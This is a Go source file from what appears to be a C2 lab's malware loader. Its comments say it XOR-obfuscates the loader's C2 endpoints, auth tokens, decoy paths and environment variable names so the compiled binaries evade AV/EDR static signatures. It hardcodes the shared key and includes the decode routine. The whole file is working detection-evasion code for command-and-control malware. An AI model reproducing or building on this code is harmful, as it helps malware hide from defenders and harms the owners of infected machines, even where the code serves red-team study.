// String obfuscation for the loader's C2-identifying literals: stage
// endpoints, auth tokens, decoy process/file paths, header names and env var
// names. Values are XOR'd at build time so the compiled loader.exe /
// loader.dll do not carry plaintext that feeds AV/EDR static signatures.
package main

// xobKey must match scripts/bake_loader_secrets.py and scripts/xor_encode.py
// (KEY = b"0p3nc0de-c2lab-x0r") — same key as the agent (agent/xor.go).
// The scripts are the source of truth for encoding; if this drifts, every
// baked value in the binary silently decodes to garbage.
var xobKey = []byte("0p3nc0de-c2lab-x0r")

// xob decodes an XOR-obfuscated string baked into the binary.
func xob(enc []byte) string {
	out := make([]byte, len(enc))
	for i := range out {
		out[i] = enc[i] ^ xobKey[i%len(xobKey)]
	}
	return string(out)
}

